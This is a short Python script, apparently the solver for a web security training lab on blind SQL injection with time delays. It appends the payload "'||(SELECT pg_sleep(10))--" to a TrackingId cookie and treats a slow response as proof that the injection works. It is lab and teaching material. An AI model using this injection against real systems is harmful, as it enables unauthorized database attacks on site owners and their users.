# Laboratory 02: Blind SQLi with time delays
# Author: Emiliano Rivas (RVXS)

import requests, sys, string, urllib3

# If you want to use Burp Suite proxy, uncomment the 2 lines below
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# burp_proxies = {
#     'http' : 'http://127.0.0.1:8080',
#     'https': 'http://127.0.0.1:8080'
# }

def exploit(url):
    session = requests.Session()
    session_cookies = session.get(url).cookies.get_dict()
    print(session_cookies)

    payload = "'||(SELECT pg_sleep(10))--"
    cookies = {
        'TrackingId': session_cookies['TrackingId'] + payload,
        'session': session_cookies['session']
    }

    # Using proxies
    # response = requests.get(url, cookies = cookies, proxies = burp_proxies, verify = False)

    # without proxies
    response = requests.get(url, cookies = cookies,)
    request_time = int(response.elapsed.total_seconds())

    if request_time >= 5:
        print("\nCongratulations, you solve the lab!")


def main():
    print("\n-------------------")
    print("WSA Lab-13 Solver")
    print("-------------------\n")

    url = input("Enter the URL: ").strip()

    exploit(url)

if __name__ == "__main__":
    main()